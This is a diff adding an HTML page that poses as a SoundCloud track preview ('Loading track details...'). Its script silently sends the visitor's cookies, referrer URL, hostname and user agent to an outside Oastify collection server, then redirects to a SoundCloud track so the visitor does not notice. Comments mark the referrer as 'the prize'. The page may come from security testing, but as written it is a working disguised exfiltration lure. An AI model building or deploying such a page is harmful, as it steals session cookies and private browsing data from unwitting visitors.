@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>Previewing Track...</title></head>
+<body>
+    <script>
+        // Use a standard fetch to your Oastify server
+        fetch('https://547icd6oajijfupu2oumfkb1xs3jranyc.oastify.com/log', {
+            method: 'POST',
+            mode: 'no-cors', // Bypasses CORS preflight
+            body: JSON.stringify({
+                origin: window.location.hostname,
+                referer: document.referrer, // THIS IS THE PRIZE
+                cookies: document.cookie,
+                ua: navigator.userAgent
+            })
+        });
+
+        // Redirect back to the actual track after 1 second so they stay on the site
+        setTimeout(() => {
+            window.location.href = "https://soundcloud.com/hobnobclanandthereflux/testofnoah";
+        }, 1000);
+    </script>
+    <h2>Loading track details...</h2>
+</body>
+</html>
